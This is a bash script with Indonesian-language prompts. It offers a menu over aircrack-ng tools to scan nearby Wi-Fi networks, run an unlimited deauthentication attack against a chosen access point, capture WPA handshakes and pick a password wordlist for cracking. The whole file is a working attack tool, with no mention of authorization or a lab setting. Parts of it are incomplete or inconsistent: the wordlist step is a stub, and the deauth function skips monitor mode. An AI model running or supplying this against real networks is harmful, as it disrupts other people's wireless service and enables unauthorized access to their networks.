#!/bin/bash

# Cek dependency
check_deps() {
    deps=("sudo" "fzf" "aircrack-ng" "aireplay-ng" "airodump-ng")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo "Error: $dep tidak terinstall!"
            exit 1
        fi
    done
}

# Main menu
main_menu() {
    clear
    options=(
        "Deauth Monitor"
        "Pilih Wordlist"
        "Capture Handshake"
        "Exit"
    )
    
    while true; do
        choice=$(printf '%s\n' "${options[@]}" | fzf --prompt="Pilih menu > " --height=40% --reverse)
        
        case "$choice" in
            "Deauth Monitor")
                deauth_monitor
                ;;
            "Pilih Wordlist")
                select_wordlist
                ;;
            "Capture Handshake")
                capture_handshake
                ;;
            "Exit")
                exit 0
                ;;
        esac
    done
}

# Fungsi deauth monitor
deauth_monitor() {
    if [[ $(id -u) != 0 ]]; then
        echo "Harus run sebagai root!"
        exit 1
    fi
    
    interfaces=($(airmon-ng | awk '/^ /{print $2}'))
    selected_if=$(printf '%s\n' "${interfaces[@]}" | fzf --prompt="Pilih interface > ")
    
    echo "Scanning networks..."
    airodump-ng "$selected_if" & 
    scan_pid=$!
    sleep 5
    kill $scan_pid
    
    target=$(awk '/(BSSID|Station)/{flag=1; next} /^$/{flag=0} flag' *.csv | fzf --prompt="Pilih target > " --header="BSSID              Channel")
    bssid=$(echo "$target" | awk '{print $1}')
    channel=$(echo "$target" | awk '{print $6}')
    
    aireplay-ng --deauth 0 -a "$bssid" "$selected_if" &
    deauth_pid=$!
    
    echo -e "\nDeauth attack running... Tekan Enter untuk stop"
    read -r
    kill $deauth_pid
}

# Fungsi pilih wordlist
select_wordlist() {
    default_dir="/usr/share/wordlists"
    wordlist=$(find "$default_dir" -type f 2>/dev/null | fzf --prompt="Pilih wordlist > " --preview="head -n 10 {}" --height=80%)
    
    if [[ -n "$wordlist" ]]; then
        echo "Wordlist dipilih: $wordlist"
        # Tambahkan logika penggunaan wordlist
    else
        echo "Tidak ada wordlist dipilih"
    fi
}

# Fungsi capture handshake
capture_handshake() {
    if [[ $(id -u) != 0 ]]; then
        echo "Harus run sebagai root!"
        exit 1
    fi
    
    interface=$(airmon-ng | awk '/^ /{print $2}' | fzf --prompt="Pilih interface > ")
    airmon-ng start "$interface"
    mon_if="${interface}mon"
    
    echo "Scanning networks..."
    airodump-ng "$mon_if" &
    scan_pid=$!
    sleep 5
    kill $scan_pid
    
    target=$(awk '/(BSSID|Station)/{flag=1; next} /^$/{flag=0} flag' *.csv | fzf --prompt="Pilih target > " --header="BSSID              Channel")
    bssid=$(echo "$target" | awk '{print $1}')
    channel=$(echo "$target" | awk '{print $6}')
    
    airodump-ng -c "$channel" --bssid "$bssid" -w capture "$mon_if" &
    dump_pid=$!
    
    aireplay-ng --deauth 0 -a "$bssid" "$mon_if" &
    deauth_pid=$!
    
    echo "Capture running... Tekan Enter untuk stop"
    read -r
    kill $dump_pid $deauth_pid
    airmon-ng stop "$mon_if"
    
    if aircrack-ng capture*.cap | grep -q "1 handshake"; then
        echo "Handshake berhasil didapat!"
    else
        echo "Gagal mendapatkan handshake"
    fi
}

# Trap untuk cleanup
cleanup() {
    kill $(jobs -p) 2>/dev/null
    rm *.csv *.cap 2>/dev/null
    airmon-ng stop "${interface}mon" 2>/dev/null
}

trap cleanup EXIT
check_deps
main_menu
